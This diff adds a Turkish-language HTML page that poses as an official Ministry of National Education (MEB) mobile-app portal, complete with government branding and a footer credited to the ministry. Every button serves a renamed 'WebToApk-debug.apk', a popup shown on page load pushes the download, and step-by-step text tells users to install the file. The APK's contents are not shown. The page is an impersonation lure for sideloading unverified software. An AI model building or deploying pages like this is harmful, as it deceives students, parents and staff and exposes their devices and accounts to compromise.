@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Milli Eğitim Bakanlığı - MEB Mobil Uygulama İndir</title>
+  <meta name="description" content="T.C. Millî Eğitim Bakanlığı Resmi Mobil Uygulama İndirme Portalı">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+    body {
+      background-color: #f8fafc;
+      color: #1e293b;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-top: 64px; /* Space for MEB top banner */
+    }
+
+    /* MEB SMART APP BANNER (Fixed Top) */
+    .meb-app-banner {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 64px;
+      background: #ffffff;
+      border-bottom: 2px solid #e11d48;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 14px;
+      z-index: 99999;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.08);
+    }
+    .banner-content {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .meb-logo-badge {
+      width: 44px;
+      height: 44px;
+      background: #e11d48;
+      border-radius: 10px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      font-weight: 900;
+      font-size: 11px;
+      line-height: 1.1;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(225,29,72,0.3);
+      flex-shrink: 0;
+    }
+    .meb-logo-badge span {
+      font-size: 16px;
+    }
+    .banner-text {
+      display: flex;
+      flex-direction: column;
+    }
+    .banner-title {
+      font-weight: 800;
+      font-size: 13.5px;
+      color: #0f172a;
+      line-height: 1.2;
+    }
+    .banner-subtitle {
+      font-size: 11px;
+      color: #64748b;
+      font-weight: 500;
+    }
+    .banner-download-btn {
+      background: #e11d48;
+      color: #ffffff;
+      text-decoration: none;
+      padding: 9px 16px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 12.5px;
+      letter-spacing: 0.3px;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      box-shadow: 0 3px 10px rgba(225,29,72,0.35);
+      transition: transform 0.15s ease, background-color 0.2s;
+      flex-shrink: 0;
+    }
+    .banner-download-btn:active {
+      transform: scale(0.95);
+      background: #be123c;
+    }
+
+    /* MEB HEADER */
+    .meb-header {
+      background: #ffffff;
+      border-bottom: 1px solid #e2e8f0;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .meb-header-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .meb-crescent {
+      color: #e11d48;
+      font-size: 24px;
+    }
+    .meb-title-main {
+      font-weight: 800;
+      font-size: 15px;
+      color: #0f172a;
+    }
+    .meb-title-sub {
+      font-size: 11px;
+      color: #64748b;
+    }
+
+    /* HERO PORTAL SECTION */
+    .portal-container {
+      max-width: 600px;
+      margin: 0 auto;
+      width: 100%;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .official-card {
+      background: linear-gradient(145deg, #ffffff, #fff1f2);
+      border: 1px solid #fecdd3;
+      border-radius: 20px;
+      padding: 22px 18px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-shadow: 0 6px 20px rgba(225,29,72,0.06);
+    }
+    .official-icon {
+      width: 76px;
+      height: 76px;
+      background: #e11d48;
+      color: #fff;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      margin-bottom: 14px;
+      box-shadow: 0 8px 24px rgba(225,29,72,0.3);
+    }
+    .official-title {
+      font-size: 19px;
+      font-weight: 800;
+      color: #0f172a;
+      margin-bottom: 4px;
+    }
+    .official-desc {
+      font-size: 13px;
+      color: #475569;
+      margin-bottom: 18px;
+      line-height: 1.4;
+    }
+    .direct-apk-btn {
+      width: 100%;
+      background: #e11d48;
+      color: #ffffff;
+      text-decoration: none;
+      padding: 16px 20px;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 6px 18px rgba(225,29,72,0.35);
+      transition: transform 0.15s;
+    }
+    .direct-apk-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* QUICK MEB SERVICES GRID */
+    .services-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+    }
+    .service-box {
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 14px;
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+    }
+    .service-icon {
+      font-size: 24px;
+    }
+    .service-name {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #0f172a;
+    }
+    .service-sub {
+      font-size: 11px;
+      color: #64748b;
+    }
+
+    /* INFO STEPS CARD */
+    .info-card {
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 16px;
+      padding: 18px;
+    }
+    .info-header {
+      font-weight: 800;
+      font-size: 14px;
+      color: #0f172a;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .step-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 12.5px;
+      color: #334155;
+      margin-bottom: 10px;
+    }
+    .step-item:last-child {
+      margin-bottom: 0;
+    }
+    .step-num {
+      background: #fee2e2;
+      color: #e11d48;
+      font-weight: 800;
+      font-size: 11px;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    /* FOOTER */
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: #94a3b8;
+      padding: 20px;
+      margin-top: auto;
+    }
+
+    /* MODAL POPUP */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0,0,0,0.5);
+      backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100000;
+      padding: 16px;
+    }
+    .modal-card {
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 24px 20px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+      animation: pop 0.25s ease-out;
+    }
+    @keyframes pop {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    .modal-btn {
+      width: 100%;
+      background: #e11d48;
+      color: #ffffff;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 800;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 8px;
+    }
+    .modal-dismiss {
+      background: transparent;
+      border: none;
+      color: #64748b;
+      font-size: 13px;
+      cursor: pointer;
+      padding: 6px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- MEB STYLE STICKY TOP APP BANNER -->
+  <div class="meb-app-banner">
+    <div class="banner-content">
+      <div class="meb-logo-badge">
+        <span>🇹🇷</span>
+        MEB
+      </div>
+      <div class="banner-text">
+        <span class="banner-title">MEB Mobil Uygulaması</span>
+        <span class="banner-subtitle">T.C. Millî Eğitim Bakanlığı</span>
+      </div>
+    </div>
+    <a href="./WebToApk-debug.apk" download="MEB_Mobil_Uygulama.apk" class="banner-download-btn" onclick="triggerAlert()">
+      <span>📥</span> İNDİR
+    </a>
+  </div>
+
+  <!-- MEB PORTAL HEADER -->
+  <div class="meb-header">
+    <div class="meb-header-title">
+      <span class="meb-crescent">☾★</span>
+      <div>
+        <div class="meb-title-main">T.C. MİLLÎ EĞİTİM BAKANLIĞI</div>
+        <div class="meb-title-sub">Mobil Hizmetler ve Uygulama Portalı</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTAINER -->
+  <div class="portal-container">
+    
+    <!-- OFFICIAL APP DOWNLOAD CARD -->
+    <div class="official-card">
+      <div class="official-icon">📱</div>
+      <h1 class="official-title">Resmi Mobil Uygulamayı İndirin</h1>
+      <p class="official-desc">
+        MEB portalları, haritalar ve tüm eğitim servislerine tek tıkla, kesintisiz ve hızlı erişmek için uygulamayı cihazınıza kurun.
+      </p>
+      <a href="./WebToApk-debug.apk" download="MEB_Mobil_Uygulama.apk" class="direct-apk-btn" onclick="triggerAlert()">
+        <span>📥</span> UYGULAMAYI İNDİR (APK)
+      </a>
+    </div>
+
+    <!-- QUICK SERVICES -->
+    <div class="services-grid">
+      <div class="service-box">
+        <span class="service-icon">📚</span>
+        <span class="service-name">EBA Ders Portalı</span>
+        <span class="service-sub">Canlı dersler ve içerikler</span>
+      </div>
+      <div class="service-box">
+        <span class="service-icon">🏫</span>
+        <span class="service-name">e-Okul Sistemi</span>
+        <span class="service-sub">Notlar ve devamsızlık</span>
+      </div>
+      <div class="service-box">
+        <span class="service-icon">🗺️</span>
+        <span class="service-name">MEB Harita & Kurumlar</span>
+        <span class="service-sub">Okul ve kurum konumları</span>
+      </div>
+      <div class="service-box">
+        <span class="service-icon">🔐</span>
+        <span class="service-name">MEBBİS Portalı</span>
+        <span class="service-sub">Personel ve öğretmen girişi</span>
+      </div>
+    </div>
+
+    <!-- INSTALLATION GUIDE -->
+    <div class="info-card">
+      <div class="info-header">
+        <span>📋</span> Nasıl Yüklenir?
+      </div>
+      <div class="step-item">
+        <span class="step-num">1</span>
+        <div>Yukarıdaki kırmızı <b>"İNDİR"</b> veya <b>"UYGULAMAYI İNDİR"</b> butonuna dokunun.</div>
+      </div>
+      <div class="step-item">
+        <span class="step-num">2</span>
+        <div>İndirilen <b>MEB_Mobil_Uygulama.apk</b> dosyasını açıp <b>"Yükle"</b> butonuna basın.</div>
+      </div>
+      <div class="step-item">
+        <span class="step-num">3</span>
+        <div>Uygulamayı açarak tüm hizmetleri mobil olarak kullanmaya başlayın.</div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- POPUP MODAL ON LOAD -->
+  <div class="modal-overlay" id="mebModal" style="display: none;">
+    <div class="modal-card">
+      <div style="font-size: 42px; margin-bottom: 10px;">🇹🇷</div>
+      <h2 style="font-size: 17px; font-weight: 800; color: #0f172a; margin-bottom: 6px;">MEB Mobil Uygulama</h2>
+      <p style="font-size: 13px; color: #64748b; margin-bottom: 18px; line-height: 1.4;">
+        Milli Eğitim Bakanlığı mobil uygulamasını doğrudan telefonunuza indirmek için butona dokunun.
+      </p>
+      <a href="./WebToApk-debug.apk" download="MEB_Mobil_Uygulama.apk" class="modal-btn" onclick="closeModal(); triggerAlert();">
+        Uygulamayı Hemen İndir
+      </a>
+      <button class="modal-dismiss" onclick="closeModal()">Siteye Devam Et</button>
+    </div>
+  </div>
+
+  <div class="footer">
+    T.C. Millî Eğitim Bakanlığı Bilgi İşlem Genel Müdürlüğü
+  </div>
+
+  <script>
+    // Show MEB Smart Modal after 400ms
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        document.getElementById('mebModal').style.display = 'flex';
+      }, 400);
+    });
+
+    function closeModal() {
+      document.getElementById('mebModal').style.display = 'none';
+    }
+
+    function triggerAlert() {
+      setTimeout(() => {
+        alert("✅ MEB Mobil Uygulaması (APK) telefonunuza indiriliyor! İndirilenler klasöründen 'MEB_Mobil_Uygulama.apk' dosyasını açıp Yükle diyebilirsiniz.");
+      }, 400);
+    }
+  </script>
+</body>
+</html>
